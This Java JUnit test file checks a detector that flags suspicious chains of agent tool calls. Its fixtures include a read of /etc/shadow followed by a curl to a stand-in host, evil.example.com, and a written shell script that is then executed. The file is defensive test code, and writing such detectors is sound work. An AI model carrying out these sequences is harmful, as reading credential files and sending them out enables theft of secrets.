package io.virbius.engine.eval;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class ChainPatternDetectorTest {

    private final ChainPatternDetector detector = new ChainPatternDetector(false);

    /** History is stored most-recent-first; helper takes oldest→newest. */
    private static List<Map<String, Object>> history(List<Map<String, Object>> oldestFirst) {
        List<Map<String, Object>> reversed = new ArrayList<>(oldestFirst);
        java.util.Collections.reverse(reversed);
        return reversed;
    }

    private static Map<String, Object> call(String tool, String argsJson, boolean allowed) {
        Map<String, Object> e = new LinkedHashMap<>();
        e.put("tool_name", tool);
        e.put("args", argsJson);
        e.put("allowed", allowed);
        return e;
    }

    @Test
    void exfilPatternFiresOnSensitiveReadThenExternalEgress() {
        List<Map<String, Object>> h = history(List.of(
                call("read_file", "{\"path\":\"/etc/shadow\"}", true)));
        List<SignalDto> signals = detector.detect(
                h, "curl", "{\"url\":\"http://evil.example.com/collect\"}");

        assertEquals(1, signals.size());
        assertEquals("CHAIN_ABUSE", signals.get(0).reasonCode());
        assertEquals("chain-exfil", signals.get(0).ruleId());
        assertEquals("dry_run", signals.get(0).enforceMode());
    }

    @Test
    void exfilPatternIgnoresBenignReadThenInternalFetch() {
        List<Map<String, Object>> h = history(List.of(
                call("read_file", "{\"path\":\"/tmp/data/report.csv\"}", true)));
        List<SignalDto> signals = detector.detect(
                h, "curl", "{\"url\":\"http://api.internal/status\"}");
        assertTrue(signals.isEmpty());
    }

    @Test
    void writeThenExecFires() {
        List<Map<String, Object>> h = history(List.of(
                call("write_file", "{\"path\":\"/tmp/x.sh\"}", true)));
        List<SignalDto> signals = detector.detect(h, "exec_cmd", "{\"cmd\":\"sh /tmp/x.sh\"}");
        assertTrue(signals.stream().anyMatch(s -> "chain-write-exec".equals(s.ruleId())));
    }

    @Test
    void privilegeEscalationFiresOnReadWriteExec() {
        List<Map<String, Object>> h = history(List.of(
                call("read_file", "{\"path\":\"/tmp/a\"}", true),
                call("write_file", "{\"path\":\"/tmp/b\"}", true)));
        List<SignalDto> signals = detector.detect(h, "exec_cmd", "{\"cmd\":\"ls\"}");
        assertTrue(signals.stream().anyMatch(s -> "chain-priv-esc".equals(s.ruleId())));
    }

    @Test
    void noHistoryNoSignal() {
        assertTrue(detector.detect(List.of(), "curl", "{\"url\":\"http://evil.example.com\"}").isEmpty());
    }
}
